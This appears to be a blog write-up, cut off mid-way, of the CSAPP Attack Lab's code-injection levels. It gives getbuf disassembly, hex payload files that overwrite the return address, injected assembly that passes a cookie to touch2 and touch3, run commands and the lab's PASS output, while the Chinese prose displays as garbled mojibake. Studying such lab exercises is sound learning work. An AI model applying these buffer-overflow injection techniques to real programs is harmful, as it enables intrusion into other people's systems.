<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="attackå®éªŒè¯¦ç»†è®°å½•">
<meta name="keywords" content="å®éªŒã€attackã€CSAPP"><title>CSAPP:attackå®éªŒ</title>

<link rel='canonical' href='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/'>

<link rel="stylesheet" href="/scss/style.min.1d7a77f66a9605dfbac1c7922a91290042c454a1166056d913fcbcea340dd583.css"><meta property='og:title' content="CSAPP:attackå®éªŒ">
<meta property='og:description' content="attackå®éªŒè¯¦ç»†è®°å½•">
<meta property='og:url' content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/'>
<meta property='og:site_name' content='Lee'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CSAPP' /><meta property='article:published_time' content='2024-09-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-10-05T19:03:09&#43;08:00'/><meta property='og:image' content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg' />
<meta name="twitter:title" content="CSAPP:attackå®éªŒ">
<meta name="twitter:description" content="attackå®éªŒè¯¦ç»†è®°å½•"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://chenyuan1125.github.io/en/p/csappattack%E5%AE%9E%E9%AA%8C/R.jpg' />

<link rel="stylesheet" href="https://s1.hdslb.com/bfs/static/jinkela/long/font/regular.css" />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/en/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu4999655723030452168.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/en">Lee</a></h1>
            <h2 class="site-description">å¤©å°†é™å¤§ä»»äºæ–¯äººä¹Ÿ</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='/'
                        
                        title="é¦–é¡µ&amp;å…³äº"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/chenyuan1125'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/en/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>å…³äº</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/en/%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>é“¾æ¥</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://chenyuan1125.github.io/en/" selected>English</option>
                                
                                    <option value="https://chenyuan1125.github.io/" >ä¸­æ–‡</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#part-icode-injection-attacks">Part I:Code Injection Attacks</a>
      <ol>
        <li><a href="#level-1">Level 1</a></li>
        <li><a href="#level-2">Level 2</a></li>
        <li><a href="#level3">Level3</a></li>
        <li><a href="#æ³¨å…¥ä»£ç ">æ³¨å…¥ä»£ç </a></li>
        <li><a href="#æ ˆå¸§è®²è§£">æ ˆå¸§è®²è§£</a></li>
        <li><a href="#solution">Solution</a></li>
      </ol>
    </li>
    <li><a href="#part-iireturn-oriented-programing">Part II:Return-Oriented Programing</a>
      <ol>
        <li><a href="#level1">level1</a></li>
        <li><a href="#solution-1">Solution</a></li>
        <li><a href="#level2">level2</a></li>
        <li><a href="#æ ˆå¸§è®²è§£-1">æ ˆå¸§è®²è§£</a></li>
        <li><a href="#solution-2">Solution</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/en/p/csappattack%E5%AE%9E%E9%AA%8C/">
                <img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8255243502125017912.jpg"
                        srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8255243502125017912.jpg 800w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu11264397315011635515.jpg 1600w"
                        width="800" 
                        height="450" 
                        loading="lazy"
                        alt="Featured image of post CSAPP:attackå®éªŒ" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/en/categories/%E5%AE%9E%E9%AA%8C/" style="background-color: #2a9d8f; color: #fff;">
                å®éªŒ
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/en/p/csappattack%E5%AE%9E%E9%AA%8C/">CSAPP:attackå®éªŒ</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            attackå®éªŒè¯¦ç»†è®°å½•
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2024-09-29</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    8 minute read
                </time>
            </div>
        
        <div>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-eye" viewBox="0 0 16 16">
  <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z"/>
  <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/>
</svg>
                <time class="article-words">
                    3735å­—
                </time>
        </div>
        

    </footer>
    

    
        <footer class="article-translations">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



            <div>
                
                    <a href="https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/" class="link">ä¸­æ–‡</a>
                
            </div>
            

        </footer>
    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="attack-lab">Attack lab
</h1><p>è¯¥å®éªŒåœ¨æˆ‘ç”µè„‘çš„wslçš„ubuntuæ“ä½œç³»ç»Ÿä¸‹æ— æ³•æ­£å¸¸è¿è¡Œï¼Œåœ¨debianç¯å¢ƒä¸‹èƒ½æ­£å¸¸è¿è¡Œï¼Œæ³¨æ„è¿è¡Œæ—¶è¦åŠ ä¸Š-q</p>
<h2 id="part-icode-injection-attacks">Part I:Code Injection Attacks
</h2><h3 id="level-1">Level 1
</h3><p>é€šè¿‡è¾“å…¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºåŸç†ï¼Œå°†getbufå‡½æ•°çš„è¿”å›åœ°å€æ”¹æˆtouch1å‡½æ•°çš„å…¥å£åœ°å€</p>
<p>æ³¨æ„å­—èŠ‚é¡ºåº</p>
<p>getbufå‡½æ•°çš„åæ±‡ç¼–ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00000000004017a8 &lt;getbuf&gt;:
</span></span><span class="line"><span class="cl">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
</span></span><span class="line"><span class="cl">  4017ac:	48 89 e7             	mov    %rsp,%rdi
</span></span><span class="line"><span class="cl">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;
</span></span><span class="line"><span class="cl">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
</span></span><span class="line"><span class="cl">  4017b9:	48 83 c4 28          	add    $0x28,%rsp
</span></span><span class="line"><span class="cl">  4017bd:	c3                   	ret    
</span></span><span class="line"><span class="cl">  4017be:	90                   	nop
</span></span><span class="line"><span class="cl">  4017bf:	90                   	nop
</span></span></code></pre></td></tr></table>
</div>
</div><p>phase_1.txtæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00 
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">c0 17 40 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt |./ctarget -q
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level-2">Level 2
</h3><p>level2éœ€è¦å°†vlevelçš„å€¼æ”¹æˆcookieå€¼ï¼Œå†returnåˆ°touch2å‡½æ•°å…¥å£å¤„ã€‚</p>
<p>ä¿®æ”¹åçš„rspå¯„å­˜å™¨å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2.png"
	width="743"
	height="584"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu13663029604867286409.png 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/phase2_hu11577064378276042830.png 1024w"
	loading="lazy"
	
		alt="å›¾1"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="305px"
	
></p>
<p>phase_2.txtæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">48 c7 c7 fa 97 b9 59 68
</span></span><span class="line"><span class="cl">ec 17 40 00 c3 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">78 dc 61 55 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿è¡Œå‘½ä»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./hex2raw &lt; phase_1.txt <span class="p">|</span>./ctarget -q
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»“æœ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Cookie: 0x59b997fa
</span></span><span class="line"><span class="cl">Type string:Touch2!: You called touch2<span class="o">(</span>0x59b997fa<span class="o">)</span>
</span></span><span class="line"><span class="cl">Valid solution <span class="k">for</span> level <span class="m">2</span> with target ctarget
</span></span><span class="line"><span class="cl">PASS: Would have posted the following:
</span></span><span class="line"><span class="cl">        user id bovik
</span></span><span class="line"><span class="cl">        course  15213-f15
</span></span><span class="line"><span class="cl">        lab     attacklab
</span></span><span class="line"><span class="cl">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA <span class="m">97</span> B9 <span class="m">59</span> <span class="m">68</span> EC <span class="m">17</span> <span class="m">40</span> <span class="m">00</span> C3 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">78</span> DC <span class="m">61</span> <span class="m">55</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level3">Level3
</h3><p>æœ¬é¢˜ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äºä¼ çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å…ˆç»™å‡º<code>touch3</code>çš„Cè¯­è¨€ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Touch3!: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>touch3</code>ä¸­è°ƒç”¨äº†<code>hexmatch</code>ï¼Œå®ƒçš„Cè¯­è¨€ä»£ç ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Compare string to hex represention of unsigned value */</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* Make position of check string unpredictable */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="nf">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦æŠŠ<code>cookie</code>è½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦ä¸²ä¼ è¿›å»</p>
<p>æ³¨æ„ç¬¬6è¡Œï¼Œ<code>s</code>çš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬å†™åœ¨<code>getbuf</code>æ ˆä¸­çš„å­—ç¬¦ä¸²å¾ˆæœ‰å¯èƒ½è¢«è¦†ç›–ï¼Œä¸€æ—¦è¢«è¦†ç›–å°±æ— æ³•æ­£å¸¸æ¯”è¾ƒã€‚</p>
<p>å› æ­¤ï¼Œè€ƒè™‘æŠŠ<code>cookie</code>çš„å­—ç¬¦ä¸²æ•°æ®å­˜åœ¨<code>test</code>çš„æ ˆä¸Šï¼Œå…¶å®ƒéƒ¨åˆ†ä¸ä¸Šé¢˜ç›¸åŒï¼Œè¿™é‡Œä¸å†é‡å¤æ€è·¯ã€‚</p>
<h3 id="æ³¨å…¥ä»£ç ">æ³¨å…¥ä»£ç 
</h3><p>å…ˆæŸ¥æ‰¾<code>test</code>æ ˆé¡¶æŒ‡é’ˆçš„ä½ç½®ï¼š</p>
<p><img src="https://pic3.zhimg.com/80/v2-a07be4da84c92ded046900c493aed9d6_1440w.webp"
	
	
	
	loading="lazy"
	
		alt="å›¾2"
	
	
></p>
<p><code>0x5561dca8</code>ï¼Œè¿™å°±æ˜¯å­—ç¬¦ä¸²å­˜æ”¾çš„ä½ç½®ï¼Œä¹Ÿæ˜¯è°ƒç”¨<code>touch3</code>åº”è¯¥ä¼ å…¥çš„å‚æ•°ï¼Œåˆ<code>touch3</code>ä»£ç çš„åœ°å€ä¸º<code>4018fa</code>ã€‚ä»è€Œå¾—åˆ°ä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4018fa</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å­—èŠ‚çº§è¡¨ç¤ºä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
